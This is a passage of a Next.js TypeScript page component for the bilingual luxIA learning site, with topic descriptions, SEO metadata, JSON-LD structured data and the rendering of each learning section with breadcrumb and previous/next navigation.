  'vector-db': { es: 'Bases de datos vectoriales: Qdrant, pgvector, Pinecone para búsqueda semántica.', en: 'Vector databases: Qdrant, pgvector, Pinecone for semantic search.' },
  rag: { es: 'RAG (Retrieval Augmented Generation): conecta LLMs con tus documentos y datos.', en: 'RAG (Retrieval Augmented Generation): connect LLMs with your documents and data.' },
  mcp: { es: 'MCP (Model Context Protocol): herramientas y extensiones para LLMs de Anthropic.', en: 'MCP (Model Context Protocol): tools and extensions for Anthropic LLMs.' },
  agents: { es: 'Agentes IA autónomos: LangChain, AutoGen, CrewAI. Crea agentes que ejecutan tareas.', en: 'Autonomous AI agents: LangChain, AutoGen, CrewAI. Create agents that execute tasks.' },
  vision: { es: 'Vision y Multimodal: procesamiento de imágenes y video con IA. OCR, clasificación, detección.', en: 'Vision and Multimodal: image and video processing with AI. OCR, classification, detection.' },
  security: { es: 'Seguridad de aplicaciones web: OWASP Top 10, SQL Injection, XSS, CSRF, autenticación segura y headers de seguridad.', en: 'Web application security: OWASP Top 10, SQL Injection, XSS, CSRF, secure authentication and security headers.' },
  'system-design': { es: 'Diseño de sistemas: monolitos vs microservicios, CAP theorem, escalabilidad, load balancers, caching y message queues.', en: 'System design: monoliths vs microservices, CAP theorem, scalability, load balancers, caching and message queues.' },
  'performance': { es: 'Performance web: Core Web Vitals, optimización de bundles, caching, imágenes, database queries y profiling.', en: 'Web performance: Core Web Vitals, bundle optimization, caching, images, database queries and profiling.' },
  'networking': { es: 'Redes y protocolos: TCP/UDP, HTTP/HTTPS, DNS, WebSockets, CORS, debugging de red y herramientas CLI.', en: 'Networking and protocols: TCP/UDP, HTTP/HTTPS, DNS, WebSockets, CORS, network debugging and CLI tools.' },
  'generative-ai': { es: 'Qué es la IA Generativa: de la ciencia ficción a tu día a día. Fundamentos, historia y aplicaciones reales.', en: 'What is Generative AI: from science fiction to your daily life. Fundamentals, history and real applications.' },
  'prompt-engineering': { es: 'Prompt Engineering: el arte de comunicarte con IAs. Técnicas, frameworks y ejemplos prácticos.', en: 'Prompt Engineering: the art of communicating with AIs. Techniques, frameworks and practical examples.' },
  'agentic-ai': { es: 'IA Agéntica: IAs que actúan por sí solas. Del chatbot al agente autónomo que ejecuta tareas.', en: 'Agentic AI: AIs that act on their own. From chatbot to autonomous agent that executes tasks.' },
  'geo': { es: 'GEO (Generative Engine Optimization): SEO para la era de la IA. Cómo aparecer en respuestas de ChatGPT, Perplexity y Claude.', en: 'GEO (Generative Engine Optimization): SEO for the AI era. How to appear in ChatGPT, Perplexity and Claude responses.' },
}

export async function generateMetadata({ params }: { params: Promise<{ locale: string; section: string }> }): Promise<Metadata> {
  const resolvedParams = await params
  const locale = resolvedParams.locale as 'es' | 'en'
  const sectionData = sections.find(s => s.slug === resolvedParams.section)

  if (!sectionData) return { title: 'Not Found' }

  const title = locale === 'es' ? sectionData.titleEs : sectionData.titleEn
  const description = sectionDescriptions[resolvedParams.section]?.[locale] ||
    (locale === 'es' ? `Aprende ${title} en luxIA. Teoría y conceptos explicados de forma clara.` : `Learn ${title} at luxIA. Theory and concepts explained clearly.`)

  const fullTitle = `${title} - Learning | luxIA`
  const url = `https://luxia.us/${locale}/learning/${resolvedParams.section}`

  return {
    title: fullTitle,
    description,
    keywords: `${title}, tutorial, ${locale === 'es' ? 'aprender' : 'learn'}, desarrollo, programación, IA, luxIA`,
    openGraph: {
      title: fullTitle,
      description,
      url,
      siteName: 'luxIA',
      locale: locale === 'es' ? 'es_ES' : 'en_US',
      type: 'article',
    },
    twitter: {
      card: 'summary_large_image',
      title: fullTitle,
      description,
    },
    alternates: {
      canonical: url,
      languages: {
        'es-ES': `https://luxia.us/es/learning/${resolvedParams.section}`,
        'en-US': `https://luxia.us/en/learning/${resolvedParams.section}`,
      },
    },
  }
}

export async function generateStaticParams() {
  return sectionOrder.flatMap(section => [
    { locale: 'es', section },
    { locale: 'en', section }
  ])
}

interface PageProps {
  params: Promise<{ locale: string; section: string }>
}

export default async function SectionPage({ params }: PageProps) {
  const resolvedParams = await params
  const locale = resolvedParams.locale as 'es' | 'en'
  const sectionSlug = resolvedParams.section
  const isSpanish = locale === 'es'

  // Buscar el section en la lista
  const sectionData = sections.find(s => s.slug === sectionSlug)

  if (!sectionData) {
    notFound()
  }

  // Buscar contenido (con alias si aplica)
  const contentKey = slugAliases[sectionSlug] || sectionSlug
  const content = sectionsContent[contentKey]
  const hasContent = !!content

  const currentIndex = sectionOrder.indexOf(sectionSlug)
  const prevSection = currentIndex > 0 ? sections[currentIndex - 1] : null
  const nextSection = currentIndex < sectionOrder.length - 1 ? sections[currentIndex + 1] : null

  const title = isSpanish ? sectionData.titleEs : sectionData.titleEn
  const levelInfo = levelLabels[sectionData.level as keyof typeof levelLabels]

  const articleDesc = sectionDescriptions[sectionSlug]?.[locale] || (isSpanish ? `Aprende ${title} en LuxIA — teoría y conceptos explicados de forma clara.` : `Learn ${title} at LuxIA — theory and concepts explained clearly.`)
  const pageUrl = `https://luxia.us/${locale}/learning/${sectionSlug}`

  return (
    <div className="max-w-3xl mx-auto">
      {/* JSON-LD · Article + BreadcrumbList (capa de entendimiento SEO+GEO, act. 2026-07-28) */}
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify({
        '@context': 'https://schema.org', '@type': 'Article',
        headline: title, description: articleDesc, inLanguage: locale,
        datePublished: '2026-01-01', dateModified: '2026-07-28',
        author: { '@type': 'Organization', name: 'LuxIA', url: 'https://luxia.us' },
        publisher: { '@type': 'Organization', name: 'LuxIA', logo: { '@type': 'ImageObject', url: 'https://luxia.us/logo.png' } },
        articleSection: sectionData.level, image: 'https://luxia.us/og-image.jpg',
        mainEntityOfPage: pageUrl, url: pageUrl,
      }) }} />
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify({
        '@context': 'https://schema.org', '@type': 'BreadcrumbList',
        itemListElement: [
          { '@type': 'ListItem', position: 1, name: isSpanish ? 'Inicio' : 'Home', item: `https://luxia.us/${locale}` },
          { '@type': 'ListItem', position: 2, name: 'Learning', item: `https://luxia.us/${locale}/learning` },
          { '@type': 'ListItem', position: 3, name: title, item: pageUrl },
        ],
      }) }} />
      {/* Breadcrumb */}
      <nav className="mb-6 text-sm">
        <ol className="flex items-center gap-2 text-slate-500">
          <li>
            <Link href={`/${locale}/learning`} className="hover:text-blue-600">
              Learning
            </Link>
          </li>
          <li>/</li>
          <li className="text-slate-900 font-medium">{title}</li>
        </ol>
      </nav>

      {/* Header */}
      <div className="mb-8">
        <div className="flex items-center gap-3 mb-3">
          <span className="text-4xl">{sectionData.icon}</span>
          <div>
            <h1 className="text-3xl font-bold text-slate-900">{title}</h1>
            <span className={`inline-block mt-1 px-2 py-0.5 rounded text-xs font-medium ${levelInfo.color}`}>
              {levelInfo[isSpanish ? 'es' : 'en']}
            </span>
          </div>
        </div>
      </div>

      {/* Content */}
      {hasContent ? (
        <article className="prose-custom">
          <MarkdownContent content={isSpanish ? content.contentEs : content.contentEn} />
        </article>
      ) : (
        /* Coming Soon */
        <div className="text-center py-16">
          <div className="text-6xl mb-6">🚧</div>
          <h2 className="text-2xl font-bold text-slate-900 mb-3">
            {isSpanish ? 'Próximamente' : 'Coming Soon'}
          </h2>
          <p className="text-slate-600 mb-6 max-w-md mx-auto">
            {isSpanish
              ? 'Estamos preparando contenido de alta calidad para este tema. ¡Vuelve pronto!'
              : 'We are preparing high-quality content for this topic. Check back soon!'}
          </p>
          <div className="flex flex-col sm:flex-row gap-3 justify-center">
            <Link
              href={`/${locale}/learning`}
              className="inline-flex items-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition"
            >
              ← {isSpanish ? 'Ver todos los temas' : 'View all topics'}
            </Link>
            <Link
              href={`/${locale}/cooking`}
              className="inline-flex items-center gap-2 px-4 py-2 bg-orange-100 text-orange-800 rounded-lg hover:bg-orange-200 transition"
            >
              👨‍🍳 {isSpanish ? 'Ir a Cooking' : 'Go to Cooking'}
            </Link>
          </div>
        </div>
      )}

      {/* Navigation */}
      <nav className="mt-12 pt-8 border-t border-slate-200 flex justify-between">
        {prevSection ? (
          <Link
            href={`/${locale}/learning/${prevSection.slug}`}
            className="flex items-center gap-2 text-slate-600 hover:text-blue-600 transition group"
          >
            <span className="group-hover:-translate-x-1 transition">←</span>
            <span className="hidden sm:inline">{isSpanish ? prevSection.titleEs : prevSection.titleEn}</span>
            <span className="sm:hidden">{isSpanish ? 'Anterior' : 'Previous'}</span>
          </Link>
        ) : <div />}

        {nextSection ? (
          <Link
            href={`/${locale}/learning/${nextSection.slug}`}
            className="flex items-center gap-2 text-slate-600 hover:text-blue-600 transition group"
          >
            <span className="hidden sm:inline">{isSpanish ? nextSection.titleEs : nextSection.titleEn}</span>
            <span className="sm:hidden">{isSpanish ? 'Siguiente' : 'Next'}</span>
            <span className="group-hover:translate-x-1 transition">→</span>
          </Link>
        ) : (
          <Link
            href={`/${locale}/learning`}
            className="flex items-center gap-2 text-blue-600 hover:text-blue-700 transition"
          >
            <span>{isSpanish ? 'Volver al índice' : 'Back to index'}</span>
          </Link>
        )}
      </nav>
    </div>
  )
}
